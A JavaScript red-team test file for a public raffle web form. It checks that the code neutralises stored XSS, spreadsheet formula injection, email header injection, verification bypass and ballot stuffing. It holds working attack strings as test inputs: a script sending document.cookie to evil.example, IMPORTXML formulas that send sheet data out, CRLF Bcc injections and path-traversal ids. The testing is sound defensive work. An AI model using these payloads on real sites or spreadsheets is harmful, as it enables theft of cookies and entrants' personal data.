/**
 * Adversarial tests for the raffle entry path.
 *
 *   node test/test_redteam.js
 *
 * test_raffle.js asks "does this work?". This file asks "what can a hostile
 * entrant make it do?". Everything here goes through the SAME sandbox and the
 * SAME real RaffleCode.gs -- these are attacks on the shipped code, not on a
 * model of it.
 *
 * The form is genuinely public: anonymous access, no Google sign-in, a QR code
 * printed on a table in the street. Anyone who scans it can also read the page
 * source, see the POST shape, and replay it with curl a thousand times. So the
 * threat model is not "a guest makes a typo", it is:
 *
 *   T1  Stored XSS  -- a payload typed into a field executes when TSG later
 *                      views it (the admin status/draw pages render entrant
 *                      names into HTML).
 *   T2  Formula injection -- a payload typed into a field becomes a live
 *                      formula when the entries Sheet is opened, which in
 *                      Sheets can exfiltrate the whole sheet to a third party.
 *   T3  Email abuse -- the request step emails a code to any address given, so
 *                      the endpoint is a free mailer: it can be pointed at a
 *                      victim, and it can burn the account's daily send quota
 *                      and take the raffle (and every other TSG form) down.
 *   T4  Ballot stuffing -- one person entering many times.
 *   T5  Draw integrity -- forcing, repeating or previewing the draw.
 *   T6  Header/protocol injection into the outbound email and the FUB API.
 *   T7  Verification bypass -- entering without ever proving the email.
 */
const { makeSandbox, at, entry, enterFull, verifySession, referral, J, DURING, BEFORE, AFTER } = require('./harness');
const AFTER_CLOSE = AFTER;

let fails = 0, passes = 0;
function check(name, cond, detail) {
  if (cond) { passes++; console.log('PASS  ' + name); }
  else { fails++; console.log('FAIL  ' + name + (detail ? '  -- ' + detail : '')); }
}
function section(t) { console.log('\n--- ' + t + ' ---'); }
function eq(name, actual, expected) {
  check(name + '  (got ' + JSON.stringify(actual) + ')', actual === expected);
}

const req = (s, d, when) => J(at(when || DURING, () =>
  s.raffleHandleSubmission_(Object.assign({ step: 'request' }, d))));

// A single journey now writes TWO rows: verifying an email writes an "own entry"
// row worth 1 ticket, and each referral writes a row of its own worth the bonus.
// So __data()[0] is the entrant's own row, not the referral -- any test that
// means "the referral row" has to say so, or it silently asserts against the
// wrong row and passes for the wrong reason.
const REFERRAL_NAME_COL = 12;
const refRows  = (s, tab) => s.__data(tab).filter(r => String(r[REFERRAL_NAME_COL] || '') !== '');
const selfRows = (s, tab) => s.__data(tab).filter(r => String(r[REFERRAL_NAME_COL] || '') === '');

// ---------------------------------------------------------------------------
section('T1  Stored XSS in the pages TSG opens');
// ---------------------------------------------------------------------------
// The admin status page and draw page build HTML by string concatenation from
// the winner's name, phone and email. Those three values came from a public
// text box. The host project deliberately stopped HTML-escaping at ingest
// (Code.gs, "audit fix M1": escaping was corrupting O'Brien on the way into
// FUB), and its comment says escaping belongs at the point of render instead --
// which is exactly here.
{
  const PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '<script>fetch("https://evil.example/"+document.cookie)</script>',
    '"><svg/onload=alert(1)>',
    "<a href='javascript:alert(1)'>click</a>"
  ];
  PAYLOADS.forEach((payload, i) => {
    const s = makeSandbox();
    const name = payload + ' Lastname';        // needs a space to pass the name check
    const r = enterFull(s, entry({ fullName: name, email: 'x' + i + '@mail-test.co',
                                   phone: '(215) 555-81' + (20 + i) }), DURING);
    check('payload ' + i + ' was accepted as an entry (setup)', !!(r && r.ok));

    const drawn = at(DURING, () => s.raffleDrawWinner_(false, true));
    check('payload ' + i + ' draw ran (setup)', !!(drawn && drawn.ok));

    const statusHtml = String(at(DURING, () => s.raffleStatusPage_(false)));
    const drawHtml   = String(at(DURING, () => s.raffleDrawPage_(false, true)));

    // The assertion: the raw payload must NOT survive into the HTML. An escaped
    // copy (&lt;img ...) is fine and is what we want to see instead.
    check('status page does not emit raw payload ' + i,
      statusHtml.indexOf(payload) === -1,
      'raw payload found in admin status HTML');
    check('draw page does not emit raw payload ' + i,
      drawHtml.indexOf(payload) === -1,
      'raw payload found in admin draw HTML');
    // Belt and braces: the admin pages' own markup is div/p/h2/b/br only, so ANY
    // other tag, or any event-handler attribute, could only have come from an
    // entrant. (Checking for the strings "onerror=" or "javascript:" would be
    // wrong here: those appear, correctly escaped and inert, as the visible text
    // of the winner's name.)
    check('status page emits no injected tag or handler attribute ' + i,
      !/<(script|img|svg|iframe|a|object|embed|style)\b/i.test(statusHtml) &&
      !/<[a-z][^>]*\son[a-z]+\s*=/i.test(statusHtml));
    check('draw page emits no injected tag or handler attribute ' + i,
      !/<(script|img|svg|iframe|a|object|embed|style)\b/i.test(drawHtml) &&
      !/<[a-z][^>]*\son[a-z]+\s*=/i.test(drawHtml));
  });

  // Backups are rendered too, from a second and third entrant.
  const s = makeSandbox();
  enterFull(s, entry({ fullName: 'Aaa Bbb', email: 'a@mail-test.co', phone: '(215) 555-8101' }), DURING);
  enterFull(s, entry({ fullName: '<img src=x onerror=alert(2)> Backup',
                       email: 'b@mail-test.co', phone: '(215) 555-8102' }), DURING);
  enterFull(s, entry({ fullName: 'Ccc Ddd', email: 'c@mail-test.co', phone: '(215) 555-8103' }), DURING);
  at(DURING, () => s.raffleDrawWinner_(false, true));
  const html = String(at(DURING, () => s.raffleDrawPage_(false, true)));
  check('backup names are escaped on the draw page',
    html.indexOf('<img src=x onerror=alert(2)>') === -1);
}

// ---------------------------------------------------------------------------
section('T2  Spreadsheet formula injection');
// ---------------------------------------------------------------------------
// appendRow() writes strings into cells. Google Sheets evaluates a cell whose
// text begins with = + - or @ as a FORMULA. IMPORTXML/IMPORTDATA/HYPERLINK in
// such a cell fire when Durand opens the sheet, with his session, and can send
// the contents of neighbouring cells -- every entrant's name, email and phone --
// to an arbitrary URL. This is the classic CSV-injection class and the entries
// sheet is a direct, unreviewed sink for three public text fields.
{
  const ATTACKS = [
    // Each carries enough real digits in the phone to satisfy the NANP check,
    // which is the trick: the junk-phone filter reads digits, not text.
    { label: 'IMPORTXML exfil via name',
      fullName: '=IMPORTXML("https://evil.example/?d="&C2,"//a") Smith',
      email: 'f1@mail-test.co', phone: '(215) 555-8131' },
    { label: 'HYPERLINK phish via name',
      fullName: '=HYPERLINK("https://evil.example","Click") Jones',
      email: 'f2@mail-test.co', phone: '(215) 555-8132' },
    { label: 'formula smuggled in the phone field',
      fullName: 'Real Person',
      email: 'f3@mail-test.co', phone: '=IMPORTDATA("https://evil.example/2155558133")' },
    { label: 'leading + operator',
      fullName: '+1+1 Person', email: 'f4@mail-test.co', phone: '(215) 555-8134' },
    { label: 'leading @ (legacy Lotus/Sheets)',
      fullName: '@SUM(1,1) Person', email: 'f5@mail-test.co', phone: '(215) 555-8135' },
    { label: 'leading - operator',
      fullName: '-2+3 Person', email: 'f6@mail-test.co', phone: '(215) 555-8136' }
  ];
  ATTACKS.forEach(a => {
    const s = makeSandbox();
    enterFull(s, entry({ fullName: a.fullName, email: a.email, phone: a.phone }), DURING);
    const rows = s.__data('Entries');
    if (!rows.length) { check(a.label + ': rejected outright (also acceptable)', true); return; }
    const cells = rows[0].map(String);
    const dangerous = cells.filter(c => /^[=+\-@]/.test(c.trim()));
    check(a.label + ': no cell starts with = + - or @',
      dangerous.length === 0,
      'live formula cell(s): ' + JSON.stringify(dangerous));
  });

  // And the data must still be READABLE -- neutralizing must not mean deleting.
  {
    const s = makeSandbox();
    enterFull(s, entry({ fullName: "=Bad Formula", email: 'f7@mail-test.co',
                         phone: '(215) 555-8137' }), DURING);
    const row = s.__data('Entries')[0];
    check('neutralized value still contains the original text',
      row && String(row[1]).indexOf('Bad Formula') !== -1,
      'got ' + JSON.stringify(row && row[1]));
  }

  // A normal name must be untouched -- no apostrophe litter on O'Brien.
  {
    const s = makeSandbox();
    enterFull(s, entry({ fullName: "Maeve O'Brien", email: 'f8@mail-test.co',
                         phone: '(215) 555-8138' }), DURING);
    const row = s.__data('Entries')[0];
    check("ordinary name is written unchanged (O'Brien)",
      row && row[1] === "Maeve O'Brien", 'got ' + JSON.stringify(row && row[1]));
  }
}

// ---------------------------------------------------------------------------
section('T3  Using the endpoint as a mailer / burning the send quota');
// ---------------------------------------------------------------------------
// Step 1 sends an email to whatever address is posted, before anything is
// verified. That is unavoidable -- it IS the verification email -- but it means
// an attacker can (a) point it at someone else repeatedly, and (b) exhaust the
// Workspace daily send quota (1,500/day), which would stop verification codes,
// stop the Open House form's emails, and stop sendErrorAlert from reporting
// that any of it happened.
//
// The shared checkRateLimit() caps submissions at 15/minute across both forms,
// which bounds the RATE but not the DAILY TOTAL: 15/min sustained is 21,600/day,
// so the quota dies in under two hours. The rate cap is also global, so it
// cannot distinguish "one attacker hammering one victim" from a real queue at
// the table. A per-address cap is the missing control. (2026-09-17: the global
// ceiling is charged per RECIPIENT, and a reserve against the real daily quota
// sits under both -- see test_raffle.js, "send-quota reserve".)
{
  const s = makeSandbox();
  const victim = 'victim@mail-test.co';
  let sentToVictim = 0, refusals = 0;
  for (let i = 0; i < 12; i++) {
    const r = req(s, entry({ fullName: 'Attacker Person', email: victim,
                             phone: '(215) 555-8' + (200 + i) }), DURING);
    if (r && r.ok && r.needsCode) sentToVictim++;
    else refusals++;
  }
  const mails = s.__sent.filter(m => m.to === victim).length;
  check('one address cannot be mailed 12 times in a row',
    mails <= 3, 'the endpoint sent ' + mails + ' emails to ' + victim);
  check('the excess requests were refused, not silently dropped',
    refusals > 0, 'every one of the 12 requests was accepted');

  // The cap must be per-address, not a global freeze: a real queue of different
  // people at the table must keep working while one address is being abused.
  const s2 = makeSandbox();
  for (let i = 0; i < 6; i++) {
    req(s2, entry({ fullName: 'Abused Target', email: 'target@mail-test.co',
                    phone: '(215) 555-8' + (300 + i) }), DURING);
  }
  const ok = req(s2, entry({ fullName: 'Honest Guest', email: 'honest@mail-test.co',
                             phone: '(215) 555-8399' }), DURING);
  check('a different, honest entrant is unaffected by another address being capped',
    !!(ok && ok.ok && ok.needsCode), JSON.stringify(ok));
}

// ---------------------------------------------------------------------------
section('T4  Ballot stuffing');
// ---------------------------------------------------------------------------
{
  // Under the multiplier rules (2026-09-17) a returning visitor is NOT turned
  // away -- they are someone back to refer another person, which is the behaviour
  // the raffle exists to produce. What must not happen is a second FREE entry: one
  // self-entry ticket per person, however many times they come back.
  const s = makeSandbox();
  // Count ONE person's free entries. A referral who consents is entered too, so
  // a bare count of self rows would include them and say nothing about stuffing.
  const selfCount = (sb, email) => sb.__data('Entries')
    .filter(r => String(r[12] || '') === '' &&               // no Referral Name = self entry
                 String(r[2] || '').toLowerCase() === email).length;
  enterFull(s, entry({ fullName: 'Dana Reid', email: 'dana@mail-test.co',
                       phone: '(215) 555-8123' }), DURING);
  eq('one free entry after the first journey', selfCount(s, 'dana@mail-test.co'), 1);

  // Same email, different phone.
  verifySession(s, entry({ fullName: 'Dana Reid', email: 'dana@mail-test.co',
                           phone: '(267) 555-9999' }), DURING);
  eq('same email + new phone mints no second free entry', selfCount(s, 'dana@mail-test.co'), 1);
  // Same phone, different email.
  verifySession(s, entry({ fullName: 'Dana Reid', email: 'dana2@mail-test.co',
                           phone: '(215) 555-8123' }), DURING);
  eq('same phone + new email mints no second free entry',
     selfCount(s, 'dana@mail-test.co') + selfCount(s, 'dana2@mail-test.co'), 1);
  // Case and formatting games.
  verifySession(s, entry({ fullName: 'dana reid', email: 'DANA@Mail-Test.CO',
                           phone: '2155558123' }), DURING);
  eq('case and formatting games mint no second free entry',
     selfCount(s, 'dana@mail-test.co') + selfCount(s, 'dana2@mail-test.co'), 1);
  // Three rows, not five: Dana's own entry, the referral, and the referral's own
  // entry from consenting. Four repeat attempts added nothing.
  eq('so still exactly three rows after four attempts', s.__data('Entries').length, 3);

  // Gmail's dot and +tag aliases all deliver to ONE inbox, so they are one
  // person for raffle purposes. This is the cheapest stuffing attack there is:
  // it needs no extra phone, no extra inbox, and it survives the email check.
  // Gmail's dot and +tag aliases all deliver to ONE inbox, so they are one person.
  // With the multiplier rules the test is no longer "are they turned away" -- it is
  // whether an alias can mint a SECOND FREE ENTRY, which is the thing worth
  // stealing now.
  const g = makeSandbox();
  // Every row that is NOT the referral's is Sam's, whichever alias wrote it.
  const gSelf = () => g.__data('Entries').filter(r => String(r[12] || '') === '' &&
    String(r[2] || '').indexOf('gmail.com') !== -1).length;
  enterFull(g, entry({ fullName: 'Sam Vance', email: 'sam.vance@gmail.com',
                       phone: '(215) 555-8401' }), DURING);
  eq('one free entry to start', gSelf(), 1);
  verifySession(g, entry({ fullName: 'Sam Vance', email: 'samvance@gmail.com',
                           phone: '(215) 555-8402' }), DURING);
  eq('a gmail dot-alias mints no second free entry', gSelf(), 1);
  verifySession(g, entry({ fullName: 'Sam Vance', email: 'sam.vance+party@gmail.com',
                           phone: '(215) 555-8403' }), DURING);
  eq('a gmail +tag alias mints no second free entry', gSelf(), 1);

  // A non-Gmail domain must NOT be collapsed the same way -- plenty of hosts
  // treat a dot as a real, distinct address.
  const o = makeSandbox();
  enterFull(o, entry({ fullName: 'Pat Lee', email: 'pat.lee@somecorp.co',
                       phone: '(215) 555-8501' }), DURING);
  const oSelf = () => o.__data('Entries').filter(r => String(r[12] || '') === '' &&
    String(r[2] || '').indexOf('somecorp.co') !== -1).length;
  verifySession(o, entry({ fullName: 'Pat Lee', email: 'patlee@somecorp.co',
                           phone: '(215) 555-8502' }), DURING);
  eq('a dot is NOT stripped on a non-Gmail domain — two distinct people, two entries',
    oSelf(), 2);
}

// ---------------------------------------------------------------------------
section('T5  Draw integrity');
// ---------------------------------------------------------------------------
{
  // A guest hitting the public form URL must not be able to reach the draw or
  // the entrant list, with a wrong key or none.
  const s = makeSandbox();
  enterFull(s, entry({ fullName: 'Aaa Bbb', email: 'd1@mail-test.co',
                       phone: '(215) 555-8601' }), DURING);
  const noKey   = String(at(DURING, () => s.raffleServeForm_({ parameter: { action: 'draw' } }, 'u')));
  const badKey  = String(at(DURING, () => s.raffleServeForm_({ parameter: { action: 'draw', key: 'guess' } }, 'u')));
  const noKeyS  = String(at(DURING, () => s.raffleServeForm_({ parameter: { action: 'status' } }, 'u')));
  check('draw with no key is refused', /Not found/.test(noKey));
  check('draw with a wrong key is refused', /Not found/.test(badKey));
  check('status with no key is refused', /Not found/.test(noKeyS));
  check('a refused draw did not actually draw', s.__props.RAFFLE_WINNER_JSON === undefined);
  check('wrong key and no key give byte-identical responses', noKey === badKey);

  // A live draw before entries close must take two asks: it is irreversible, and
  // an accidental bookmark tap at 4pm would lock in a winner from a near-empty
  // sheet with an hour of entries still to come.
  const g = makeSandbox();
  enterFull(g, entry({ fullName: 'Early Bird', email: 'early@mail-test.co',
                       phone: '(215) 555-8602' }), DURING);
  const early = at(DURING, () => g.raffleDrawWinner_(false));
  check('an unforced live draw before the close time is refused',
    !(early && early.ok), JSON.stringify(early));
  check('the refused early draw stored no winner', g.__props.RAFFLE_WINNER_JSON === undefined);
  const forced = at(DURING, () => g.raffleDrawWinner_(false, true));
  check('an explicitly forced early draw still works', !!(forced && forced.ok));
  // Reaching it through the admin URL requires the key AND the extra flag.
  const noForce = String(at(DURING, () => makeSandbox().raffleServeForm_(
    { parameter: { action: 'draw', key: 'k' } }, 'u')));
  check('the admin draw URL without a key is still refused', /Not found/.test(noForce));

  // The draw is once-only: a second call returns the same winner, never a new one.
  const s2 = makeSandbox();
  ['a', 'b', 'c', 'd'].forEach((c, i) => enterFull(s2, entry({
    fullName: 'Guest ' + c.toUpperCase() + ' Person', email: c + '@mail-test.co',
    phone: '(215) 555-87' + (10 + i) }), DURING));
  const first  = at(DURING, () => s2.raffleDrawWinner_(false, true));
  const second = at(DURING, () => s2.raffleDrawWinner_(false, true));
  check('re-drawing returns the identical winner',
    first.ok && second.ok && first.result.winner.email === second.result.winner.email);
  check('re-draw is flagged as already drawn', !!second.alreadyDrawn);

  // Test mode must never be able to touch the live draw or the live sheet.
  const t = makeSandbox({ qaMode: true });
  at(BEFORE, () => t.raffleHandleSubmission_(Object.assign({ step: 'request' },
    entry({ fullName: 'Qa Tester', email: 'qa@mail-test.co', phone: '(215) 555-8888' }))));
  check('a test-mode entry never lands on the live tab', t.__data('Entries').length === 0);
  check('test mode does not set the live winner property',
    t.__props.RAFFLE_WINNER_JSON === undefined);
}

// ---------------------------------------------------------------------------
section('T6  Header and protocol injection');
// ---------------------------------------------------------------------------
{
  // CRLF in a name would, in a naive mailer, let an attacker add Bcc: headers
  // to the winner email that goes to Durand and Ryan.
  const s = makeSandbox();
  enterFull(s, entry({ fullName: 'Eve\r\nBcc: attacker@evil.example\r\n Adams',
                       email: 'crlf@mail-test.co', phone: '(215) 555-8701' }), DURING);
  at(DURING, () => s.raffleDrawWinner_(false, true));
  const winMail = s.__sent.filter(m => /Winner/i.test(m.subject)).pop();
  check('a draw email was produced (setup)', !!winMail);
  check('no CR/LF survives into the email subject',
    !!winMail && !/[\r\n]/.test(String(winMail.subject)),
    JSON.stringify(winMail && winMail.subject));
  check('the recipient list is not attacker-influenced',
    !!winMail && String(winMail.to).indexOf('attacker@evil.example') === -1);

  // Same for the phone field, which is stored raw (only its digits are checked).
  const p = makeSandbox();
  enterFull(p, entry({ fullName: 'Raw Phone', email: 'rawphone@mail-test.co',
                       phone: '(215) 555-8702\r\nBcc: attacker@evil.example' }), DURING);
  const row = p.__data('Entries')[0];
  check('no CR/LF is stored in the phone cell',
    !row || !/[\r\n]/.test(String(row[3])), JSON.stringify(row && row[3]));

  // The FUB note must stay plain text -- if isHtml ever flipped, every note
  // body would render entrant-controlled markup inside the CRM.
  const f = makeSandbox();
  enterFull(f, entry({ fullName: '<b>Bold</b> Person', email: 'fub@mail-test.co',
                       phone: '(215) 555-8703' }), DURING);
  const note = f.__fetches.find(x => /\/v1\/notes/.test(x.url));
  check('a FUB note was posted (setup)', !!note);
  check('FUB notes are posted as plain text, not HTML',
    !!note && JSON.parse(note.o.payload).isHtml === false);
}

// ---------------------------------------------------------------------------
section('T7  Verification bypass');
// ---------------------------------------------------------------------------
{
  // Posting step=verify directly, with no prior request, must write nothing.
  const s = makeSandbox();
  const forged = J(at(DURING, () => s.raffleHandleSubmission_({
    step: 'verify', vid: '11111111-1111-4111-8111-111111111111', code: '123456' })));
  check('a forged verify with an unknown vid is refused', !(forged && forged.ok));
  check('a forged verify wrote no row', s.__data('Entries').length === 0);

  // A vid that is not a UUID must not even reach the cache.
  ['', 'x', '../../etc/passwd', '{}', 'a'.repeat(200)].forEach((bad, i) => {
    const r = J(at(DURING, () => s.raffleHandleSubmission_({
      step: 'verify', vid: bad, code: '123456' })));
    check('malformed vid ' + i + ' is refused', !(r && r.ok));
  });

  // Brute force: 6 digits, 5 attempts. After the cap the pending entry is gone.
  const b = makeSandbox();
  const r1 = req(b, entry({ fullName: 'Brute Force', email: 'brute@mail-test.co',
                            phone: '(215) 555-8801' }), DURING);
  const realCode = String(b.__sent[b.__sent.length - 1].subject).match(/(\d{6})/)[1];
  let accepted = 0;
  for (let i = 0; i < 8; i++) {
    const guess = String((Number(realCode) + i + 1) % 1000000).padStart(6, '0');
    const r = J(at(DURING, () => b.raffleHandleSubmission_({
      step: 'verify', vid: r1.vid, code: guess })));
    if (r && r.ok) accepted++;
  }
  check('no wrong code was ever accepted', accepted === 0);
  const afterCap = J(at(DURING, () => b.raffleHandleSubmission_({
    step: 'verify', vid: r1.vid, code: realCode })));
  check('the REAL code is dead after the attempt cap is hit', !(afterCap && afterCap.ok));
  check('brute force wrote no row', b.__data('Entries').length === 0);

  // The entry must be written from the cached values, not from whatever the
  // second request carries -- otherwise verify someone else's address, enter
  // your own.
  const v = makeSandbox();
  const vr = req(v, entry({ fullName: 'Real Name', email: 'real@mail-test.co',
                            phone: '(215) 555-8802' }), DURING);
  const code = String(v.__sent[v.__sent.length - 1].subject).match(/(\d{6})/)[1];
  const sess = J(at(DURING, () => v.raffleHandleSubmission_({
    step: 'verify', vid: vr.vid, code: code,
    fullName: 'Swapped Name', email: 'swapped@mail-test.co', phone: '(267) 555-0000' })));
  // The row is written at the REFERRAL step now, so the swap is attempted again
  // there -- that is where it would actually have to succeed to do any damage.
  at(DURING, () => v.raffleHandleSubmission_({
    step: 'referral', vid: sess.vid, consent: 'Yes',
    fullName: 'Swapped Name', email: 'swapped@mail-test.co', phone: '(267) 555-0000',
    referralName: 'Robin Vale', referralEmail: 'robin@mail-test.co',
    referralPhone: '(215) 555-9001', referralRole: 'Buyer',
    referralTimeframe: '7-12 Months' }));
  const w = v.__data('Entries')[0];
  check('the verified (cached) email is written, not the one re-posted',
    !!w && w[2] === 'real@mail-test.co', JSON.stringify(w && w[2]));
  check('the verified (cached) name is written',
    !!w && w[1] === 'Real Name', JSON.stringify(w && w[1]));

  // Consent cannot be skipped, spoofed as a truthy non-'Yes', or omitted.
  ['no', '', 'true', '1', 'YES ', undefined].forEach((c, i) => {
    const cs = makeSandbox();
    const r = req(cs, { fullName: 'No Consent', email: 'nc' + i + '@mail-test.co',
                        phone: '(215) 555-89' + (10 + i), consent: c }, DURING);
    check('consent value ' + JSON.stringify(c) + ' is refused', !(r && r.ok));
  });
}

// ---------------------------------------------------------------------------
section('T8  Referral entry: consent tokens, claims and the invite mailer');
// ---------------------------------------------------------------------------
// New surface as of 2026-09-17. An entry now depends on a THIRD PARTY acting,
// which adds three things an attacker can reach for: the consent token (a bearer
// credential sitting in somebody else's inbox), the claim on a referred person
// (worth stealing, because only the first claim counts), and the invite email
// (a second way to make this endpoint mail a stranger).
// (verifySession and referral are imported at the top of this file)

const stage = (s, who, ref, when) => {
  const v = verifySession(s, entry(who), when || DURING);
  if (!v || !v.vid) return { v: v };
  const st = J(at(when || DURING, () => s.raffleHandleSubmission_(
    Object.assign({ step: 'referral', vid: v.vid }, referral(ref)))));
  return { v: v, staged: st };
};

{
  // -- the consent token must be unguessable and must not be a free-form id.
  const s = makeSandbox();
  const a = stage(s, {}, {}, DURING);
  check('a referral stages a token', /^[0-9a-fA-F-]{36}$/.test(String(a.staged.token)),
    JSON.stringify(a.staged));

  ['', 'x', '1', '../../etc/passwd', 'a'.repeat(200), '{}',
   '11111111-1111-4111-8111-111111111111'].forEach((bad, i) => {
    const r = J(at(DURING, () => s.raffleHandleSubmission_({
      step: 'consent', decision: 'confirm', token: bad, consent: 'Yes',
      referralName: 'Mal Ory', referralEmail: 'mal@mail-test.co',
      referralPhone: '(215) 555-9500', referralRole: 'Buyer' })));
    check('forged consent token ' + i + ' is refused', !(r && r.ok), JSON.stringify(r));
  });
  // Self entries are eligible by design, so scope this to REFERRAL rows.
  check('no referral row became eligible from a forged token',
    s.__data('Entries').filter(r => String(r[12] || '') !== '' &&
                                    String(r[11]) === 'eligible').length === 0);

  // -- consent cannot be spoofed with a truthy non-'Yes'.
  ['no', '', 'true', '1', undefined].forEach((c, i) => {
    const r = J(at(DURING, () => s.raffleHandleSubmission_({
      step: 'consent', decision: 'confirm', token: a.staged.token, consent: c,
      referralName: 'Robin Vale', referralEmail: 'robin@mail-test.co',
      referralPhone: '(215) 555-9001', referralRole: 'Buyer' })));
    check('consent value ' + JSON.stringify(c) + ' is refused at the consent page',
      !(r && r.ok), JSON.stringify(r));
  });
}

{
  // -- claim stealing. Only the first entrant to get a referral confirmed gets
  //    the entry, so the second must not be able to take it by racing or by
  //    editing the address on the consent page.
  const s = makeSandbox();
  const a = stage(s, {}, {}, DURING);
  const b = stage(s, { fullName: 'Second Entrant', email: 'second@mail-test.co',
                       phone: '(267) 555-8210' },
                     { referralName: 'Other Person', referralEmail: 'other@mail-test.co',
                       referralPhone: '(215) 555-9200' }, DURING);
  check('two different referrals both stage', !!a.staged.staged && !!b.staged.staged);

  // A consents normally.
  J(at(DURING, () => s.raffleHandleSubmission_({
    step: 'consent', decision: 'confirm', token: a.staged.token, consent: 'Yes',
    referralName: 'Robin Vale', referralEmail: 'robin@mail-test.co',
    referralPhone: '(215) 555-9001', referralRole: 'Buyer' })));

  // B's referral now edits their own details on the consent page to impersonate
  // A's referral -- the one address the submit-time check could not have seen.
  const steal = J(at(DURING, () => s.raffleHandleSubmission_({
    step: 'consent', decision: 'confirm', token: b.staged.token, consent: 'Yes',
    referralName: 'Robin Vale', referralEmail: 'robin@mail-test.co',
    referralPhone: '(215) 555-9001', referralRole: 'Buyer' })));
  check('a second claim on the same person does not become an entry',
    !!(steal && steal.superseded), JSON.stringify(steal));
  const eligibleRefs = s.__data('Entries').filter(r => String(r[12] || '') !== '' &&
                                                      String(r[11]) === 'eligible');
  check('exactly one eligible REFERRAL row for that person', eligibleRefs.length === 1,
    'got ' + eligibleRefs.length);

  // And the draw must agree. Three people: both entrants, plus Robin, who was
  // entered by consenting to A's referral. Eight tickets: A's own 1 plus the 5
  // bonus, Robin's 1, B's 1 -- and nothing at all for B's stolen claim.
  const drawn = at(AFTER_CLOSE, () => s.raffleDrawWinner_(false, true));
  check('the draw sees all three people', drawn.ok && drawn.result.totalPeople === 3,
    JSON.stringify(drawn && drawn.result && drawn.result.totalPeople));
  check('and the bonus was awarded exactly once',
    drawn.ok && drawn.result.totalTickets === 3 + 5,
    JSON.stringify(drawn && drawn.result && drawn.result.totalTickets));
}

{
  // -- the invite is a mailer. It must not be re-triggerable, and a token must
  //    not be usable from someone else's session.
  const s = makeSandbox();
  const a = stage(s, {}, {}, DURING);
  const before = s.__sent.length;
  const first = J(at(DURING, () => s.raffleHandleSubmission_(
    { step: 'invite', vid: a.v.vid, token: a.staged.token })));
  check('the invite sends once', !!(first && first.sent));
  let resends = 0;
  for (let i = 0; i < 5; i++) {
    const r = J(at(DURING, () => s.raffleHandleSubmission_(
      { step: 'invite', vid: a.v.vid, token: a.staged.token })));
    if (r && r.sent) resends++;
  }
  check('the invite cannot be re-sent by pressing the button again', resends === 0);
  const toReferral = s.__sent.slice(before).filter(m => m.to === 'robin@mail-test.co');
  check('the referred person got exactly one email', toReferral.length === 1,
    'got ' + toReferral.length);

  // Durand, 2026-09-17: "put both the entrant and referral on the email." They
  // still both get one -- as TWO messages, not one cc'd message, because a cc
  // would hand the entrant the consent token. The entrant's copy is asserted in
  // its own block below ("THE CONSENT LINK IS A BEARER CREDENTIAL").
  const invite = toReferral[0];
  check('the invite copies nobody', !invite.cc, JSON.stringify(invite.cc));
  const receipt = s.__sent.filter(m => String(m.to) === 'dana@mail-test.co' &&
    /here is exactly what went out/.test(String(m.subject)));
  check('the entrant gets their own copy instead', receipt.length === 1,
    'got ' + receipt.length);
  check('and info@ is copied on that one',
    !!receipt.length && String(receipt[0].cc || '').indexOf('info@tsg.homes') !== -1,
    receipt.length && String(receipt[0].cc));
  // Replies must reach BOTH the referrer and the shared inbox (Durand,
  // 2026-09-17): the referrer is who the recipient knows, info@ is what is always
  // watched, and either alone drops half the cases.
  check('replies reach the entrant, not a noreply address',
    /dana@mail-test\.co/.test(String(invite.replyTo || '')), String(invite.replyTo));
  check('and the shared inbox too',
    /info@tsg\.homes/.test(String(invite.replyTo || '')), String(invite.replyTo));
  check('the invite leads with who referred them',
    /Dana Reid referred you/.test(String(invite.subject)), String(invite.subject));

  // A token from another entrant's session must not send anything.
  const other = verifySession(s, entry({ fullName: 'Nosy Person',
    email: 'nosy@mail-test.co', phone: '(267) 555-8220' }), DURING);
  const hijack = J(at(DURING, () => s.raffleHandleSubmission_(
    { step: 'invite', vid: other.vid, token: a.staged.token })));
  check("another entrant cannot drive someone else's invite", !(hijack && hijack.sent),
    JSON.stringify(hijack));
}

{
  // -- HTML injection into the invite email and the consent page. Both render
  //    entrant-controlled text, so both are sinks like the admin pages were.
  const s = makeSandbox();
  const payload = '<img src=x onerror=alert(1)>';
  const a = stage(s, { fullName: payload + ' Entrant' },
                     { referralName: payload + ' Referral' }, DURING);
  J(at(DURING, () => s.raffleHandleSubmission_(
    { step: 'invite', vid: a.v.vid, token: a.staged.token })));
  const mail = s.__sent.filter(m => /referred you/.test(String(m.subject))).pop();
  check('an invite was produced (setup)', !!mail);
  check('the invite HTML does not carry the raw payload',
    !!mail && String(mail.htmlBody).indexOf(payload) === -1,
    'raw payload found in the invite email');

  const page = String(at(DURING, () => s.raffleConsentPage_(
    { parameter: { t: a.staged.token } })));
  check('the consent page does not carry the raw payload',
    page.indexOf(payload) === -1, 'raw payload found on the consent page');

  // Differential check. The page has its own <script> and <style> blocks, so a
  // flat "no script tags" assertion would either be vacuous or fail on the page's
  // own chrome. Render the SAME page for a benign name and compare tag counts:
  // any difference could only have come from the entrant.
  const benign = makeSandbox();
  const b2 = stage(benign, { fullName: 'Plain Entrant' },
                           { referralName: 'Plain Referral' }, DURING);
  const clean = String(at(DURING, () => benign.raffleConsentPage_(
    { parameter: { t: b2.staged.token } })));
  const tags = h => (h.match(/<[a-z][a-z0-9]*\b/gi) || []).length;
  check('a hostile name adds no extra tags to the consent page',
    tags(page) === tags(clean), tags(page) + ' vs ' + tags(clean));

  // Counting `on...=` attributes is the wrong test here and says so: the payload
  // lands inside value="..." as &lt;img src=x onerror=...&gt;, so the literal
  // text "onerror=" IS present and is completely inert -- raffleEsc_ escapes both
  // < and ", so it cannot open a tag or close the attribute. What matters is that
  // the payload exists ONLY in escaped form.
  check('the payload survives only as escaped text',
    page.indexOf('&lt;img src=x onerror=') !== -1, 'escaped copy not found');
  check('no unescaped image/script/svg tag anywhere on the page',
    !/<\s*(img|svg|iframe|object|embed)\b/i.test(page));
  check('every < the entrant supplied was escaped',
    (page.match(/&lt;/g) || []).length > (clean.match(/&lt;/g) || []).length);

  // And the sheet cells written from the consent page are formula-safe too.
  J(at(DURING, () => s.raffleHandleSubmission_({
    step: 'consent', decision: 'confirm', token: a.staged.token, consent: 'Yes',
    referralName: '=IMPORTXML("https://evil.example","//a") Person',
    referralEmail: 'robin@mail-test.co', referralPhone: '(215) 555-9001',
    referralRole: 'Buyer', referralTimeframe: '7-12 Months' })));
  const row = s.__data('Entries')[0].map(String);
  const live = row.filter(c => /^[=+\-@]/.test(c.trim()));
  check('no consent-page value becomes a live formula', live.length === 0,
    JSON.stringify(live));
}

{
